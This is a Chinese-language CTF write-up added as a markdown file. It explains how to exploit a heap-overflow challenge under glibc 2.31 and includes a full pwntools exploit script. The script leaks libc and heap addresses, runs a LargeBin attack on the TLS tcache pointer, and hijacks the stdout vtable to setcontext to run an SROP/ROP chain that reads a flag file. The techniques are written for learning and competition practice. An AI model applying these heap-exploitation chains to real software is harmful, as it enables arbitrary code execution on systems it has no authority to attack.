@@ -1,0 +1,171 @@
+# glibc2.31下通过IOAttack开启ROP
+##### 译文声明
+本文是翻译文章
+译文仅供参考，具体内容表达以及含义原文为准。
+## 程序分析
+  * 每次开始前会检查两个hook
+  * Add会情况tcache
+  * Delete就是正常的删除
+  * View会根据strlen的结果输出
+  * Edit则是根据命令来的
+  * Gift则会安装下面的命令解析, 有一个向上的堆溢出
+## 思路
+  * 虽然输入时进行了00阶段, 但是Edit写入时没有00阶段 把一个chunk放入LargeBin然后再申请出来, 然后利用Edit覆盖掉00再通过View就可以得到libc地址和heap地址
+  * Gift没有限制p的上限因此是存在堆溢出的, 但是Gift只读入0x100, 而chunk最少0x400, 所以必须要写一个循环的小程序实现: 
+    * [会判断note[idx][p]是否为00, 如果是00的话就跳转到]后面一个位置, 如果不是则什么也不做相当于nop
+    * 因此把chunk全部用AAA填充, 然后Gift执行`[>]`, 就可以跳过所有的非空字符, 然后利用多个`,>`解析堆溢出
+  * 有了堆溢出之后由于限制了size>0x400, 所以就想LargeBinAttack,在rtld_global中写入一个heap地址, 劫持fini_arr段, 在exit时触发getshell, 但是找了半天发现程序没用exit(), 调用的都是_exit(), 所以就只能放弃
+  * exit()无法利用, 并且hook会有检查, 翻一下题目发现会时不时的调用printf() getchar() 等IO相关函数, 因此就只能进行IOAttack了.
+  * 可是只有一个堆地址写入无法完成IOAttack, 必须扩大战果, 后来发现一个比较鸡贼的地方, size>0x400包含一个0x410的大小, 而0x410就是tcache能管理的最大的size了. 所以利用LargeBinAttack直接打TLS段中的tcache指针, 劫持`tcache->next[0x410]`这个链表的链表, 从而实现任意写. 同时Add每次覆盖的都是原来的tcache对象, 不会影响劫持的, 然后就可以开启IOAttack了
+  * 2.31下的IOAttack是比较简单的, 虽然不能劫持虚表指针, 但是stdin/ stdout/ stderrr三个标准流使用虚表位于一个可写入段, 可以直接利用tcache去覆盖虚表中的函数指针为OGG, 然后调用getchar()或者printf()函数, 直接getshell
+  * 但是后续发现禁用了execve(), 因此只能想办法通过IOAttack进行ROP, 后续发现getchar()的虚表调用指令是`mov rax, [虚表+偏移]; jmp rax`也就是说rax中就是指令地址, 这种跳转是无法通过GG去控制更多寄存器的, 而printf()的虚表调用指令为`lea rax, [虚表+偏移]; jmp [rax]`跳转之后rax残留的指针指向虚表区域, 也就是我们可控的位置, 是有希望通过rax控制更多寄存器的.
+  * 但是我利用了一个更巧妙的方法来进行ROP, 虚表中调用的函数有一个特点: 函数的第一个参数就IO_FILE对象自己, 对于printf来说, 如果能够 **控制IO_2_1_stdout为SigreturnFrame并且控制_IO_file_jumps中__overflow函数为setcontext就可以开启ROP** ,
+  * 这就要求Tcache任意写两次, 可是我们只能申请一个属于tcache的size, 但是如何要写入的地方存在一个执行下一个要写入地址的指针, 就可以直接伪造一个包含2个chunk的0x410的tcache链表, 这个条件是否存在呢?结果时存在的
+  * stdout使用的虚表同时被stdin stdout stderr三个流使用, 并且有一个特点: **stderr正好高就位于stdout上方不远处**
+  * 也就是说可以把令`tcache->next[0x410] = &stderr->vtable`, 
+    * malloc(0x408)首先会申请到stderr的vtable指针所在位置, 向后8字节就是stdout
+    * 取出chunk1时有: `tcache->next[0x410] = (&stderr->vtable)->next = vtabele`,
+    * 因此再次malloc(0x408)就可以申请到stdout使用的虚表, 完成劫持
+  * 至此我们可以控制rdi与rip, 直接覆盖函数指针为setcontext就可以开启SROP.
+  * 但是我想额外说明一下SROP时rdi与rdx的问题. 2.27一下的libc中setcontext函数全称使用的都是rdi, 但是在2.31中setcontext设置寄存器部分的使用的是rdx设置寄存器
+  * 当我们只能控制rdi与rip时有两种绕过思路 
+    * rdi设置为frame地址, 调用setcontext(). 但是必须要设置保存浮点状态的指针`frame['&fpstate']`部分为一个可读写的地址, 这样直接执行setcontext()是没问题的
+    * 第二种是寻找一个通过rdi设置rdx与rip的GG, 利用这个GG中转一下, **把rdi与rip的控制权转换为rdx与rip的控制权** , 然后跳转到setcontext+61处, 不执行fldenv指令, 直接进入到设置通用寄存器的部分
+  * 我个人更喜欢第一种思路, 只需要顺便设置一个可读可写地址, 就不用费心思中转了
+## EXP
+    #! /usr/bin/python
+    # coding=utf-8
+    import sys
+    from pwn import *
+    context.log_level = 'debug'
+    context(arch='amd64', os='linux')
+    def Log(name):
+        log.success(name+' = '+hex(eval(name)))
+    libc = ELF('./libc.so.6')
+    if(len(sys.argv)==1):            #local
+        cmd = ["./pwn"]
+        sh = process(cmd)
+    else:                            #remtoe
+        sh = remote(host, port)
+    def Num(n): 
+        sh.send(str(n).ljust(0x10, '\x00'))
+    def Cmd(n):
+        sh.recvuntil('>> \n')
+        Num(n)
+    def Add(sz, cont=''):
+        if(cont==''):
+            cont = 'A'*sz
+        Cmd(1)
+        sh.recvuntil('Size: ')
+        Num(sz)
+        sh.recvuntil('Message: ')
+        sh.send(cont)
+    def Delete(idx):
+        Cmd(2)
+        sh.recvuntil('Index: ')
+        Num(idx)
+    def View(idx):
+        Cmd(3)
+        sh.recvuntil('Index: ')
+        Num(idx)
+    def Edit(idx, cont):
+        Cmd(4)
+        sh.recvuntil('Index: ')
+        Num(idx)
+        sh.recvuntil('Code :')
+        sh.send(cont)
+    def Gift(idx, cont):
+        Cmd(5)
+        sh.recvuntil('Index: ')
+        Num(idx)
+        sh.recvuntil('Code :')
+        sh.send(cont)
+    def Exit():
+        Cmd(6)
+    def GDB():
+        gdb.attach(sh, '''
+        telescope (0x0000555555554000+0x204050) 16
+        break *(0x0000555555554000+0x1c1c)
+        break *0x7ffff7e520cf
+        break *0x7ffff7e4ea26
+        ''')
+    # A用来泄露地址, DF属于同一个LargeBin用于进行LargeBinAttack, E用于隔开DF防止合并, C用于溢出D
+    Add(0x420)  #A
+    Add(0x408)  #B
+    Add(0x407)  #C
+    Add(0x460)  #D
+    Add(0x408)  #E
+    Add(0x450)  #F
+    Add(0x408)
+    #先把A放入LargeBin中再取出来使其残留相关地址
+    Delete(0)   #UBA
+    Add(0x500)    # 整理到LB中, LBA
+    Delete(0)   
+    Add(0x420, 'A')  #get A again
+    #覆盖00截断, 读出bk获取libc地址
+    Edit(0, '&('*0x8+'\n')
+    sh.send('A'*8)
+    View(0)
+    sh.recvuntil('A'*8)
+    libc.address = u64(sh.recv(6)+b'\x00\x00')-0x1ebbe0-0x3f0
+    Log('libc.address')
+    #覆盖00阶段的部分, 读出fd_nextsize获取heap地址, 后续发现其实没heap地址也可以
+    Edit(0, '&('*0x10+'\n')
+    sh.send('A'*0x10)
+    View(0)
+    sh.recvuntil('A'*0x10)
+    heap_addr = u64(sh.recv(6)+b'\x00\x00')-0x2b0
+    print(hex(heap_addr))
+    #后续LargeBinAttack时会覆盖TLS的tcache指针为F的地址, 因此预先在F中伪造一个tcache对象
+    Delete(5)
+    exp = b'\x02'*0x268    # 一个链表有2个chunk
+    exp+= p64(libc.address+0x1ec698)    #同时控制stdout与虚表的关键: Tcache[0x410] = &stderr->vtable
+    exp = exp.ljust(0x450, b'\x00')
+    Add(0x450, exp)    #申请时写入, 因此Edit用起来不太方便
+    #先把同一个Largebin中更大的那一个放入Largebin中, 因为LargeBinAttack在 要整理的chunk是所属Largebin最小chunk时 发生
+    Delete(3)
+    Add(0x500)  #LBD
+    #进行堆溢出, 覆盖D->bk_nextsize = tcache@TLS - 0x20
+    exp = '[>]'+('>,')*0x29+'\n'
+    Gift(2, exp)
+    sh.send(b'A'+flat(0x471, libc.address+0x1ebfe0, libc.address+0x1ebfe0, 0, libc.address+0x1f34f0-0x20))
+    #把D整理到所属Largebin中, 触发LargeBinAttack, 劫持Tcache
+    Delete(5)    #UBD, LBF
+    Add(0x500)
+    #至此我们有Tcache-> (stdout-0x8) -> (_IO_file_jumps)
+    #先申请出来的chunk位于stdout附近, 因此要在这里布置好SigreturnFrame, 同时要保存原有数据, 不能干扰正常的调用虚表函数的逻辑
+    exp =flat(0)            #stderr->vtable
+    exp+= flat(0xfbad2087)  #stdout
+    for i in range(12):
+        exp+= flat(i)
+    ret = libc.address+ 0x25679
+    buf = libc.address+0x1ec878
+    rdi = libc.address+0x26b72
+    rsi = libc.address+0x27529
+    rdx = libc.address+0x11c371 #pop rdx; pop r12; ret;
+    exp+= flat(libc.address+0x1eb980)
+    exp+= flat(0x101, 0x102, 0x103)
+    exp+= flat(libc.address+0x1ee4c0)
+    exp+= flat(0x201, 0x202)
+    exp+= flat(libc.address+0x1ec790)      # frame['rsp'], 指向后面的rop部分
+    exp+= flat(ret)      # frame['rip']
+    exp+= flat(0x302, 0x303, 0xffffffff, 0x305, 0x306)
+    exp+= flat(libc.address+0x1ed4a0)
+    exp+= flat(libc.address+0x1ec5c0)
+    exp+= flat(libc.address+0x1ec6a0)
+    #要执行的ROP
+    rop = flat(rdi, buf, rsi, 0, libc.symbols['open'])
+    rop+= flat(rdi, 3, rsi, buf, rdx, 0x30, 0, libc.symbols['read'])
+    rop+= flat(rdi, 1, rsi, buf, rdx, 0x30, 0, libc.symbols['write'])
+    exp+= rop.ljust(208, b'\x00')
+    exp+= flat(0, 0, 0)
+    exp+= b'./flag\x00'
+    #覆盖stdout
+    Add(0x408, exp)     #alloc to stdout
+    #再次申请覆盖就是虚表了, 直接覆盖为setcontext就好
+    exp = cyclic(0x38)
+    exp+= flat(libc.symbols['setcontext'])  
+    Add(0x408, exp) #alloc to vtable 
+    #然后调用printf触发ROP
+    Edit(1, 'A\x00')
+    sh.interactive()
